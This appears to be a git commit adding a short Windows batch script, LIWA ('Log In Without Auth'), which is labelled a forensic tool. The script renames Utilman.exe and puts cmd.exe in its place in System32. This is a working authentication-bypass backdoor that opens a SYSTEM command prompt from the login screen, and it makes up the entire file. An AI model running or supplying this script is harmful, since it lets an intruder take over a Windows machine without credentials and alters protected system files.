89cec62583f8a45017767094a356b53c7edb540e
Frank0t <57467146+Frank0t@users.noreply.github.com>
2019-11-23 07:04:23 -0300

    Create LIWA.bat

---
+++ LIWA.bat
@@ -0,0 +1,7 @@
+@echo off
+title W0D - LIWA
+echo Forensic tool: Log In Without Auth. By FrAnK0T
+cd C:\Windows\System32                                                                                                               
+ren "Utilman.exe" "Utilmanbackdr.exe"
+ren "cmd.exe" "utilman.exe"
+pause
